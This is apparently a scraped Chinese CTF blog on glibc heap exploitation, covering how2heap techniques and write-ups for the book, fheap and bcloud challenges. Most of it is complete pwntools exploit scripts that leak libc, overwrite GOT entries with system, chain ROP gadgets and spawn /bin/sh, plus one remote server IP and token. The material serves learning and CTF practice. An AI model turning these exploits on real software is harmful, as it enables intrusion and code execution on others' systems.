leak libc_base &amp; elf_basepayload1 = '%9$lx-%38$lx'p.recvuntil('something\\n')# gdb.attach(p)p.sendline(payload1)addr = p.recvline()[:-1].split('-')libc.address = int(addr[0], 16) - 0x18ba47elf.address = int(addr[1], 16) - 0x8d0print 'elf_base =&gt; ', hex(elf.address)print 'libc_address =&gt; ', hex(libc.address)system_addr = libc.symbols['system']binsh_addr = libc.search('/bin/sh').next()print 'system_addr =&gt; ', hex(system_addr)print 'binsh_addr =&gt; ', hex(binsh_addr)printf_addr = hex(libc.symbols['printf'])print 'printf_addr =&gt; ', printf_addr# UAFprintf_got = elf.got['printf']print 'printf_got =&gt; ', hex(printf_got)# gdb.attach(p)payload2 = 'a' * (0x100 - 0x10) + p64(printf_got + 0x2) + p64(printf_got)print payload2p.recvuntil('something\\n')# gdb.attach(p)p.sendline(payload2)# edit printf_got to system_addroffset = int(printf_addr[-6:-4], 16) - 1print hex(offset)offset1 = int(hex(system_addr - libc.address)[4:], 16) + int(str(printf_addr)[-4] + '000', 16)print hex(offset1)# gdb.attach(p)payload3 = '%&#123;&#125;x'.format(offset) + '%36$hhn'payload3 += '%&#123;&#125;x'.format(offset1 - offset) + '%37$hn'# payload3 = '%37$lx'p.recvuntil('something\\n')p.sendline(payload3)# getshellp.recvuntil('something\\n')p.sendline('/bin/sh\\x00')p.interactive() book一个简单的堆的题目。由于程序在每次add()时候都会申请一个相应大小的fastbin和smallbin，释放时fastbin放到对应链表中，smallbin放到unsortbin链表中。其中feedback()没有检查堆的长度，修改可造成堆溢出。 feedback()123456789101112131415161718192021222324252627_BYTE *feedback()&#123; _BYTE *result; // rax@7 unsigned int v1; // [sp+8h] [bp-8h]@1 unsigned int i; // [sp+Ch] [bp-4h]@1 v1 = 0; for ( i = 0; (signed int)i &lt;= 3; ++i ) &#123; if ( auther_name_array[5 * (signed int)i] &amp;&amp; feedback_array[5 * (signed int)i] ) printf(\"feedback of book%d is %s\\n\", i, feedback_array[5 * (signed int)i]); &#125; puts(\"Which book do you want to modify the feedback?\"); __isoc99_scanf(\"%d\", &amp;v1); result = (_BYTE *)v1; if ( (v1 &amp; 0x80000000) == 0 ) &#123; result = (_BYTE *)v1; if ( (signed int)v1 &lt;= 3 ) &#123; result = (_BYTE *)feedback_array[5 * (signed int)v1]; if ( result ) result = read_feadback(feedback_array[5 * (signed int)v1]); &#125; &#125; return result;&#125; 这个函数不仅会造成堆溢出，还可用来泄露一些地址。简单观察可以发现fastbin的链表可以通过堆溢出修改，也就是说我们可以使用house_of_spirit来分配得到一个指向bss段的chunk，然后修改feedback_array[]这个指针数组，并通过feedback()来泄露libc的地址。但是还要找到一个bss上的0x10,0x20,0x30...的数字才能构造，事实上bss上存有feedback_length[]这个数组，我们可以通过UAF去得到一个数字即可。 bss段数据：1234567891011121314151617181920212223242526272829303132333435.bss:0000000000601D00 _bss segment para public 'BSS' use64.bss:0000000000601D00 assume cs:_bss.bss:0000000000601D00 ;org 601D00h.bss:0000000000601D00 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000601D00 public stdin.bss:0000000000601D00 ; FILE *stdin.bss:0000000000601D00 stdin dq ? ; DATA XREF: main+17\u0018r.bss:0000000000601D00 ; Copy of shared data.bss:0000000000601D08 align 10h.bss:0000000000601D10 public stdout.bss:0000000000601D10 ; FILE *stdout.bss:0000000000601D10 stdout dq ? ; DATA XREF: main+35\u0018r.bss:0000000000601D10 ; Copy of shared data.bss:0000000000601D18 byte_601D18 db ? ; DATA XREF: sub_400850+9\u0018r.bss:0000000000601D18 ; sub_400850:loc_4008A6\u0018w.bss:0000000000601D19 align 20h.bss:0000000000601D20 qword_601D20 dq ? ; DATA XREF: sub_400850+17\u0018r.bss:0000000000601D20 ; sub_400850+3C\u0018w ....bss:0000000000601D28 align 20h.bss:0000000000601D40 ; int dword_601D40[].bss:0000000000601D40 dword_601D40 dd ? ; DATA XREF: random+115\u0018r.bss:0000000000601D40 ; add+71\u0018w.bss:0000000000601D44 align 8.bss:0000000000601D48 ; __int64 index_array[].bss:0000000000601D48 index_array dq ? ; DATA XREF: add+9A\u0018w.bss:0000000000601D48 ; exchange+C5\u0018r ....bss:0000000000601D50 ; __int64 feedback_length[].bss:0000000000601D50 feedback_length dq ? ; DATA XREF: add+19F\u0018w.bss:0000000000601D50 ; sub_400F67+BB\u0018r ....bss:0000000000601D58 ; __int64 auther_name_array[].bss:0000000000601D58 auther_name_array dq ? ; DATA XREF: add+D9\u0018w.bss:0000000000601D58 ; add+F7\u0018r ....bss:0000000000601D60 ; __int64 feedback_array[].bss:0000000000601D60 feedback_array dq ? ; DATA XREF: random+F3\u0018r.bss:0000000000601D60 ; random+235\u0018r ... 所以我的思路如下： 通过一定的堆排布，是的fastbin在地址上连续，使得堆溢出可以修改相邻堆块的指针。 在堆排布的同时申请一个长度为0x20的feedback，使得0x20用来我们以后伪造fastbin并分配来用。 通过堆溢出修改相邻已经free了的fastbin，修改指针使其指向我们刚才已经伪造的bss上的地址。 修改freeback_array[]，使一个指针为atoi_got。 再次使用feedback()泄露atoi，并计算libc得到system，并修改atoi_got为system。 getshell exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python# coding=utf-8from pwn import *slog = 0local = 1debug = 0if slog: context(log_level = 'debug')#, terminal = ['tmux', 'splitw', '-h'])if local: p = process('./book')else: p = remote()if local and debug: gdb.attach(p, open('debug'))bss = 0x0000000000601D00elf = ELF('./book')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')atoi_got = elf.got['atoi']def add(author, length, feedback): p.recvuntil('!!\\n') p.sendline(str(2)) p.recvuntil('author:\\n') p.sendline(author) p.recvuntil('it?\\n') p.sendline(str(length)) p.sendline(feedback)def delete(index): p.recvuntil('!!\\n') p.sendline(str(3)) p.recvuntil('book?\\n') p.sendline(str(index))def feedback(index, feedback): p.recvuntil('!!\\n') p.sendline(str(4)) p.recvuntil('feedback?') p.sendline(str(index)) p.sendline(feedback)def pwn():# use UAF to exploit house_of_spirit # UAF add(str(0), 0x30, 'a') delete(0) add(str(1), 0x20, 'b') delete(0) add(str(2), 0x10, 'c') delete(0) add(str(3), 0x20, 'd') # index 0 payload = 'a' * 0x20 + p64(0) + p64(0x21) + p64(0x601d58 - 0x10) feedback(0, payload) add(str(4), 0x10, 'e') # index 2# gdb.attach(p) add(str(5), 0x10, 'f' * 0x8 + p64(atoi_got)) # index 1# leak atoi_addr p.recvuntil('!!\\n') p.sendline('4') p.recvuntil('is ') atoi_addr = u64(p.recv(6) + '\\x00\\x00')# gdb.attach(p) p.recvline() print 'atoi_addr =&gt; ', hex(atoi_addr)# edit atoi to system libc.address = atoi_addr - libc.symbols['atoi'] system_addr = libc.symbols['system'] print 'system_addr =&gt; ', hex(system_addr) binsh_addr = libc.search('/bin/sh').next() p.sendline('0') p.sendline(p64(system_addr))# gdb.attach(p)# getshell p.recvuntil('!!\\n') p.send('/bin/sh\\x00') p.interactive()if __name__ == '__main__': pwn()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"}]},{"title":"how2heap","date":"2017-03-28T09:45:10.000Z","path":"2017/03/28/how2heap/","text":"0x00堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。以how2heap为学习路径，step by step，记录下，可能的话，帮助到后来的人。 File Technique Applicable CTF Challenges first_fit.c 演示glibc malloc的首次适应(first-fit)行为 fastbin_dup.c 通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针 fastbin_dup_into_stack.c 通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针 9447-search-engine unsafe_unlink.c Exploiting free on a corrupted chunk to get arbitrary write. HITCON CTF 2014-stkof house_of_spirit.c Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. hack.lu CTF 2014-OREO poison_null_byte.c Exploiting a single null byte overflow. PlaidCTF 2015-plaiddb house_of_lore.c Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. overlapping_chunks.c 利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配 hack.lu CTF 2015-bookstore house_of_force.c 溢出Top chunk头去分配，来得到一个接近任意地址的指针 Boston Key Party 2016-cookbook, BCTF 2016-bcloud unsorted_bin_attack.c 利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数 0ctf 2016-zerostorage house_of_einherjar.c Exploiting a single null byte overflow to trick malloc into returning a controlled pointer Seccon 2016-tinypad 0x01 first fit这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。 0x02 fastbin dupfastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。 0x03 fastbin dup into stack(double-free)这个就是double-free的一个利用。当我们malloc一个小于128的堆块的时候，ptmalloc就会调用到fastbin。fastbin是由一个单链表组成的，遵循FIFO原则，由于fastbin在free的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。比如： 1234int *a = malloc(8) ;int *b = malloc(8);free(a);free(b); 此时维护的一个链表结构为[head] -&gt; b -&gt; a -&gt; null 当我们再次 free(a); 此时的链表结构为 [head] -&gt; a -&gt; b -&gt; a -&gt; null 紧接着我们申请两次堆 12*a = malloc(8);*b = malloc(8); 此时我们维护的链表结构为 [head] -&gt; a -&gt; null 如果我们修改a的前八个字节为我们的希望的地址，当我们两次malloc之后，我们就能得到一个指向任意地址的指针。 123*a = &amp;attribute_addr;int *c = malloc(8); //c == aint *d = malloc(8); // d == attribute_addr 维护的链表如下 123[head] -&gt; a -&gt; null[head] -&gt; a -&gt; attribute[head] -&gt; attribute 于是我们就可以得到一个8bit的任意地址写了。 以下用2016hctf的就是干为例 例题首先分析程序，先查看程序的保护 1234567ubuntu@VM-250-199-ubuntu:~/ctf-problem/2016hctf/pwn/fheap$ checksec pwn-f [*] '/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭aslr的，但是它会给程序加上一个默认的基地址0x555555554000 这个程序有两个功能： 添加字符串 删除一个字符串 其中，存储字符串的结构题如下： 123456789101100000000 info struc ; (sizeof=0x20, mappedto_1)00000000 content db 16 dup(?) ; string(C)00000010 size dq ?00000018 DestroyFunc dq ? ; 这里是程序的调用的free函数的地址00000020 info endsstruct info&#123; char cintent[16]; int size; void* DestroyFunc;&#125;; 当我们申请小于15字节的长度时，字符串会直接保存在info.content中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的info.content中 123456789101112131415161718if ( nbytesa &gt; 15 )&#123; dest = (char *)malloc(nbytesa); if ( !dest ) &#123; puts(\"malloc faild!\"); exit(1); &#125; strncpy(dest, &amp;buf, nbytesa); *(_QWORD *)ptr = dest; *((_QWORD *)ptr + 3) = sub_D6C; // free(*content) // free(content)&#125;else&#123; strncpy(ptr, &amp;buf, nbytesa); *((_QWORD *)ptr + 3) = sub_D52; // free(content)&#125; 小于15时堆内存分布1234pwndbg&gt; x/6xg 0x5555557570000x555555757000: 0x0000000000000000 0x00000000000000310x555555757010: 0x0000000061616161 0x0000000000000000 // content0x555555757020: 0x0000000000000004 0x0000555555554d52 // size + DestroyFunc 大于15时堆内存的分布情况12345678pwndbg&gt; x/6xg 0x5555557570600x555555757060: 0x0000000000000000 0x00000000000000210x555555757070: 0x6161616161616161 0x6262626262626161 // content0x555555757080: 0x000000000a626262 0x0000000000020f81pwndbg&gt; x/6xg 0x5555557570300x555555757030: 0x0000000000000000 0x00000000000000310x555555757040: 0x0000555555757070 0x0000000000000000 // new malloc addr0x555555757050: 0x0000000000000014 0x0000555555554d6c // size + DestroyFunc 再来看一下全局变量的堆管理情况 12345678910111213pwndbg&gt; telescope 0x555555554000+0x2020C000:0000│ 0x5555557560c0 (__bss_start+32) ◂— 0x101:0008│ 0x5555557560c8 (__bss_start+40) —▸ 0x555555757010 ◂— 0x61616161 /* 'aaaa' */02:0010│ 0x5555557560d0 (__bss_start+48) ◂— 0x103:0018│ 0x5555557560d8 (__bss_start+56) —▸ 0x555555757040 —▸ 0x555555757070 ◂— 'aaaaaaaaaabbbbb...'04:0020│ 0x5555557560e0 (__bss_start+64) ◂— 0x105:0028│ 0x5555557560e8 (__bss_start+72) —▸ 0x555555757090 —▸ 0x5555557570c0 ◂— 'ccc\\naaaaaabbbbb...'06:0030│ 0x5555557560f0 (__bss_start+80) ◂— 0x0... ↓pwndbg&gt; x/6xg 0x555555554000+0x2020C00x5555557560c0: 0x0000000000000001 0x00005555557570100x5555557560d0: 0x0000000000000001 0x00005555557570400x5555557560e0: 0x0000000000000001 0x0000555555757090 堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。 看一下删除操作的函数实现：123456789101112if ( *((_QWORD *)&amp;manage + 2 * v1 + 1) ) &#123; printf(\"Are you sure?:\"); read(0, &amp;buf, 0x100uLL); if ( !strncmp(&amp;buf, \"yes\", 3uLL) ) &#123; (*(void (__fastcall **)(_QWORD, const char *))(*((_QWORD *)&amp;manage + 2 * v1 + 1) + 24LL))( *((_QWORD *)&amp;manage + 2 * v1 + 1), \"yes\"); *((_DWORD *)&amp;manage + 4 * v1) = 0; &#125; &#125; 官方的源码如下：123456789101112131415161718void deleteStr() &#123; int id; char buf[0x100]; printf(\"Pls give me the string id you want to delete\\nid:\"); id = getInt(); if (id &lt; 0 || id &gt; 0x10) &#123; printf(\"Invalid id\\n\"); &#125; if (Strings[id].str) &#123; printf(\"Are you sure?:\"); read(STDIN_FILENO,buf,0x100); if(strncmp(buf,\"yes\",3)) &#123; return; &#125; Strings[id].str-&gt;free(Strings[id].str); Strings[id].inuse = 0; &#125;&#125; 这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用fastbin不会检查是否已释放的特点，我们可以构造double-free那么我们就可以利用这一点，如果在结构体调用的DestroyFunc覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位puts时，程序将会执行puts(contents)而不是free(content)，通过适当content，我们可以泄露程序基址。在结构体的DestroyFunc部分，即使开了PIE，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。 所以总结，此题的漏洞点在UAF&amp;double-free。ecp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#! /usr/bin/pythonfrom pwn import *context.log_level = 'debug'target = process('pwn-f')def create(size, string): target.recvuntil('quit') target.sendline('create ') target.recvuntil('size:') target.sendline(str(size)) target.recvuntil('str:') target.send(string)def delete(id): target.recvuntil('quit') target.sendline('delete ') target.recvuntil('id:') target.sendline(str(id)) target.recvuntil('sure?:') target.sendline('yes')create(4, 'aaa\\n')create(4, 'aaa\\n')delete(0)delete(1)delete(0)create(4, '\\x00')create(0x20, 'a' * 0x16 + 'lo' + '\\x2d\\x00')delete(0)target.recvuntil('lo')addr = target.recvline()addr = addr[:-1]addr = u64(addr + '\\x00' * (8 - len(addr))) - 0xd2ddelete(1)create(4, '\\x00')target.recvuntil('quit')target.sendline('create ')target.recvuntil('size:')target.sendline(str(0x20))target.recvuntil('str:')target.send('a' * 0x18 + p64(0x00000000000011DC + addr))print hex(addr)target.recvuntil('quit')target.sendline('delete ')target.recvuntil('id:')target.sendline('1')target.recvuntil('sure?:')ropchain = p64(addr + 0x00000000000011e3) # pop rdiropchain += p64(addr + 0x202070) # got@mallocropchain += p64(addr + 0x0000000000000990) # plt@putropchain += p64(addr + 0x00000000000011e3) # pop rdiropchain += p64(1)ropchain += p64(addr + 0x00000000000011DA) # magicropchain += p64(0) # rbxropchain += p64(1) # rbpropchain += p64(addr + 0x0000000000202058) # r12 -&gt; rip got@readropchain += p64(8) # r13 -&gt; rdxropchain += p64(addr + 0x0000000000202078) # r14 -&gt; rsi got@atoiropchain += p64(0) # r15 -&gt; rdiropchain += p64(addr + 0x00000000000011C0) # magicropchain += 'a'*8*7ropchain += p64(addr + 0x0000000000000B65) # getInttarget.sendline('yes ' + ropchain)addr = target.recvline()[:-1]addr = u64(addr + '\\x00' * (8 - len(addr)))#addr = addr - 534112 + 288144addr = addr - 537984 + 283536print hex(addr)target.sendline(p64(addr)+'/bin/sh')target.interactive() 另外一种方法，更简单，参考链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level = 'debug'global iolibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')elf = ELF('./pwn-f')def create_list(io,length,strr): io.recvuntil('quit') io.sendline('create ') io.recvuntil('Pls give string size:') io.sendline(length) io.recvuntil('str:') io.sendline(strr)def delete_list(io,number): io.recvuntil('quit') io.sendline('delete ') io.recvuntil('id:') io.sendline(number) io.recvuntil('Are you sure?:') io.sendline('yes')def pwn(): global io debug = 1 if debug: io = process('./pwn-f') else: #io = remote('127.0.0.1',2333) io = remote('115.28.78.54',80) io.recvuntil('please input you token: ') io.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')#------------------------------------------------use fsb to leak __libc_start_main's address create_list(io,'10','aaaa') create_list(io,'10','bbbb') create_list(io,'10','cccc') delete_list(io,'0') delete_list(io,'1') delete_list(io,'2') content1 = \"%175$p\".ljust(24,'a')+'\\xd0\\xf9\\x00' create_list(io,'29',content1) delete_list(io,'1') #-----printf('%113$p') data = io.recv(14) libc_start_main = int(data,16)-240 print \"libc_start_main_addr=\"+hex(libc_start_main)#--------------------------------------------------caculate system_addr libc_start_main_offset = libc.symbols['__libc_start_main'] system_addr = libc.symbols['system'] system_addr = libc_start_main - libc_start_main_offset + system_addr print \"system_addr=\" + hex(system_addr) create_list(io,'10','zzzz\\x00') create_list(io,'10','aaaa\\x00') create_list(io,'10','bbbb\\x00') create_list(io,'10','cccc\\x00') delete_list(io,'2') delete_list(io,'3') delete_list(io,'4')#----------can't have '\\x00' in string.because len(string) must &gt;15.And after '/bin/sh' must have a space. content2 = \"/bin/sh #\".ljust(24,'a')+ p64(system_addr) create_list(io,'32',content2) delete_list(io,'3') #system('/bin/sh') io.sendline('uname -a') io.interactive()if __name__ == '__main__': while True: try: pwn() except EOFError: print 'guess not success!!!' io.close() time.sleep(0.5) 0x04 unsafe unlink这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当前一个堆块空闲时，向后合并；当后一个堆块空闲时，向前合并。 glibc的unlink宏（简化版）：1234567FD = P-&gt;fd;BK = P-&gt;bk;if(FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P)&#123; FD-&gt;bk = P; BK-&gt;fd = P;&#125; 当我们存在向后合并的情况时：1234567891011121314151617181920212223242526272829303132333435/*| chunk1(p1) | chunk2(p2) |*/#include &lt;stdio.h&gt;void *ptr;int main()&#123; int prev_size, size, fd, bk; void *p1, *p2; char buf[253] = \"\"; p1 = malloc(252); p2 = malloc(252); ptr = p1; prev_size = 0; size = 249; fd = (int)(&amp;ptr) - 0xc; bk = (int)(&amp;ptr) - 0x8; memset(buf, 'c', 253); memcpy(buf, &amp;prev_size, 4); memcpy(buf+4, &amp;size, 4); memcpy(buf+8, &amp;fd, 4); memcpy(buf+12, &amp;bk, 4); size = 248; memcpy(&amp;buf[248], &amp;size, 4); buf[252] = '\\x00'; memcpy(p1, buf, 253); free(p2); return 0;&#125; 此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏12345678910111213141516171819/*P为fake_chunk，由chunk2-&gt;pre_size得到P == ptr;*/FD = P-&gt;fd; // FD = P-&gt;fd = &amp;ptr - 0xc = *(ptr + 0x8)BK = P-&gt;bk; // BK = P-&gt;bk = &amp;ptr - 0x8 = *(ptr + 0xc)if(FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P)/* 此时 FD-&gt;bk = ptr = *(&amp;ptr - 0xc + 0xc) BK-&gt;fd = ptr = *(&amp;ptr - 0x8 + 0x8) 绕过检查*/&#123; FD-&gt;bk = BK; // FD-&gt;bk = &amp;ptr - 0x8; ptr == &amp;ptr - 0x8; BK-&gt;fd = FD; // BK-&gt;fd = &amp;ptr - 0xc; ptr == &amp;ptr - 0xc;&#125;/*最后ptr = &amp;ptr - 0xc*/ 0x05 house of spirit0x09 house of force我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。 这里我们来看how2heap中给出的demo 首先我们定义一个全局变量bss_var，值为This is a string that we want to overwrite. 我们查看下他的地址为0x60206012pwndbg&gt; p &amp;bss_var $3 = (char (*)[44]) 0x602060 &lt;bss_var&gt; 然后我们分配一个大小256堆块，地址为0x7fffffffdec812pwndbg&gt; p &amp;p1$4 = (intptr_t **) 0x7fffffffdec8 由于已使用中的chunk要加上8byte的prev_size和8byte的size 所以真实的chunk的起始地址为0x603410此时我们查看堆的地址如下12345678910111213141516171819202122232425262728pwndbg&gt; heap Top Chunk: 0x603520Last Remainder: 00x603000 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0x20706f7420656854, bk = 0x7473206b6e756863, fd_nextsize = 0x2074612073747261, bk_nextsize = 0x3832353330367830&#125;0x603410 PREV_INUSE &#123; prev_size = 0, size = 273, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x603520 PREV_INUSE &#123; prev_size = 0, size = 133857, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 此时原先的top chunk的大小为133857-1(1为flag位) 我们修改top chunk的size为-1(0xffffffffffffffff)此时，top chunk的大小为123456780x603520 &#123; prev_size = 0, size = 0, fd = 0xffffffffffffffff, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了 我们分配的大小为unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;也就是0xffffffffffffeb28，得到这样一个大数以实现堆的反向分配 此时我们再分配就得到了bbs_var了，我们可以对bbs_var做读写操作了 例题2017zctf的dragon和2016bctf的bclould 先看2016bctf这题在输入姓名时存在有漏洞的截断，当我们输入i个字符时，是在第i+1的位置添加\\x00然而，但是我们后面看到的地址的赋值操作时，会把\\x00给覆盖掉，当我们strcpy时，就会把堆指针给copy进去。 12345678910111213141516int sub_80487A1()&#123; char buffer; // [sp+1Ch] [bp-5Ch]@1 char *_name; // [sp+5Ch] [bp-1Ch]@1 int v5; // [sp+6Ch] [bp-Ch]@1 v5 = *MK_FP(__GS__, 20); memset(&amp;buffer, 0, 80u); puts(\"Input your name:\"); read_buf((int)&amp;buffer, 64, 10); _name = (char *)malloc(64u); name_addr = (int)_name; //这里存在将'\\x00'覆盖的情况 strcpy(_name, &amp;buffer); sub_8048779((int)_name); return *MK_FP(__GS__, 20) ^ v5;&#125; 1234567pwndbg&gt; telescope 0x915d008 2000:0000│ eax 0x915d008 ◂— 0x61616161 ('aaaa')... ↓0f:003c│ 0x915d044 ◂— 0x62616161 ('aaab')10:0040│ 0x915d048 —▸ 0x915d008 ◂— 0x61616161 ('aaaa')11:0044│ edx 0x915d04c ◂— 0x20f0012:0048│ 0x915d050 ◂— 0x0 这里我们能看到输出的是name_addr这个指针的值。 接下来的org和host的copy其实也存在这个漏洞。1234567891011121314151617181920212223int sub_804884E()&#123; char org; // [sp+1Ch] [bp-9Ch]@1 char *_org; // [sp+5Ch] [bp-5Ch]@1 int host; // [sp+60h] [bp-58h]@1 char *_host; // [sp+A4h] [bp-14h]@1 int v5; // [sp+ACh] [bp-Ch]@1 v5 = *MK_FP(__GS__, 20); memset(&amp;org, 0, 0x90u); puts(\"Org:\"); read_buf((int)&amp;org, 64, 10); puts(\"Host:\"); read_buf((int)&amp;host, 64, 10); _host = (char *)malloc(64u); _org = (char *)malloc(64u); org_addr = (int)_org; host_addr = (int)_host; strcpy(_host, (const char *)&amp;host); strcpy(_org, &amp;org); puts(\"OKay! Enjoy:)\"); return *MK_FP(__GS__, 20) ^ v5;&#125; 好吧，其实这里还是细心才能看到的漏洞，我们发现strcpy(_org, &amp;org);这里其实是会把org+_org+host的数据全部copy到堆上，实事上我们可以调试发现，host的数据正好覆盖了top chunk的size，也就是wildness，这里我们修改为0xffffffff 覆盖前：1234560x945a098: 0x00000000 0x00000000 0x00000000 0x000000000x945a0a8: 0x00000000 0x00000000 0x00000000 0x000000000x945a0b8: 0x00000000 0x00000000 0x00000000 0x000000000x945a0c8: 0x00000000 0x00000000 0x00000000 0x000000000x945a0d8: 0x00000000 0x00020e71 0x00000000 0x000000000x945a0e8: 0x00000000 0x00000000 0x00000000 0x00000000 覆盖后：1234567pwndbg&gt; x/40wx 0x945a0980x945a098: 0x61616161 0x61616161 0x61616161 0x616161610x945a0a8: 0x61616161 0x61616161 0x61616161 0x616161610x945a0b8: 0x61616161 0x61616161 0x61616161 0x616161610x945a0c8: 0x61616161 0x61616161 0x61616161 0x616161610x945a0d8: 0x0945a098 0xffffffff 0x00000000 0x000000000x945a0e8: 0x00000000 0x00000000 0x00000000 0x00000000 我们发现0x945a0d8这行的值被修改为我们想要的0xffffffff了。 这题能够通过house of force来解决。 我实现的步骤： leak name_addr 的堆地址，并通过计算得到top chunk的地址 修改wildness为0xffffffff(-1) 分配一个大小为wanted_addr - top_chunk_addr堆块， 此时再分配得到的堆块即在wanted_addr地址上，我们就可以操纵这里的数据了 修改此处的堆块数据，覆盖content_addr[]为free_got, read_got, atoi_got edit()id0的结构，修改free_got为printf delete()id1，泄露read的地址 edit()id2， 修改atoi为system getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context(log_level = 'critical')p = process('./bcloud')elf = ELF('./bcloud')libc = ELF('/lib32/libc.so.6')atoi_got = elf.got['atoi']read_got = elf.got['read']free_got = elf.got['free']printf_plt = elf.plt['printf']bss = 0x0804B060content_length = 0x0804b0a0content_addr = 0x804B120def new(length, content): p.recvuntil('&gt;&gt;\\n') p.sendline('1') p.recvuntil('content:\\n') p.sendline(str(length)) p.recvuntil('content:\\n') p.sendline(content)def edit(index, content): p.recvuntil('&gt;&gt;\\n') p.sendline('3') p.recvuntil('id:\\n') p.sendline(str(index)) p.recvuntil('content:\\n') p.sendline(content) p.recvuntil('success.\\n')def leak_overwrite_wildness(): p.recvuntil('name:\\n')# raw_input() p.send('a' * (0x40 - 1) + 'b') p.recvuntil('b') addr = p.recv(4) p.recvline() p.recvuntil('Org:\\n') p.send('a' * 0x40) p.recvuntil('Host:\\n') p.sendline('\\xff\\xff\\xff\\xff') return u32(addr)def main():# leak name_heap_addr name_heap_addr = leak_overwrite_wildness() print 'name_heap =&gt; ', hex(name_heap_addr - 0x08) base_heap = name_heap_addr + 0xd0 print 'base_heap =&gt; ', hex(base_heap)# malloc a gabage chunk to bss offset = bss - base_heap + 0x30 print 'offset =&gt; ', offset new(offset, 'abcdabcd') # id0# malloc a chunk on bss of free and overwrite content_length[] &amp; content_addr[] payload = '' payload += p32(4) payload += p32(4) payload += p32(4) payload += (content_addr - content_length - len(payload)) * '\\x00' payload += p32(free_got) # id0 payload += p32(read_got) # id1 payload += p32(atoi_got) # id2 new('168', payload)# overwrite free_got with printf_plt edit(0, p32(printf_plt))# '4.Delete' to printf libc to get system_addr p.recvuntil('&gt;&gt;\\n') p.sendline('4') p.recvuntil('id:\\n') p.sendline(str(1)) read_addr = u32(p.recv(4)) print 'read_addr =&gt; ', read_addr# modify atoi to system libc.address = read_addr - libc.symbols['read'] system_addr = libc.symbols['system'] payload2 = p32(system_addr) edit(2, payload2)# getshell p.recvuntil('&gt;&gt;\\n') p.sendline('/bin/sh\\n') p.interactive()if __name__ == '__main__': main() 0x09 overlapping chunks除了how2heap上演示的extend freed chunks，参考了这篇文章后面的内容。 堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。how2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。 查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。 以how2heap例题2015hack.lu的books为例。 存在明显的堆溢出，程序逻辑如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 result; // rax@4 __int64 v4; // rcx@16 signed int v5; // [sp+4h] [bp-BCh]@5 void *final_str; // [sp+8h] [bp-B8h]@0 void *order1; // [sp+18h] [bp-A8h]@1 void *order2; // [sp+20h] [bp-A0h]@1 char *dest; // [sp+28h] [bp-98h]@1 char s; // [sp+30h] [bp-90h]@6 __int64 v11; // [sp+B8h] [bp-8h]@1 v11 = *MK_FP(__FS__, 40LL); order1 = malloc(0x80uLL); order2 = malloc(0x80uLL); dest = (char *)malloc(0x80uLL); if ( order1 &amp;&amp; order2 &amp;&amp; dest ) &#123; v5 = 0; puts(\" Crappiest and most expensive books for your college education!\\n\\nWe can order books for you in case they're not in stock.\\nMax. two orders allowed!\\n\"); while ( &#123; if ( 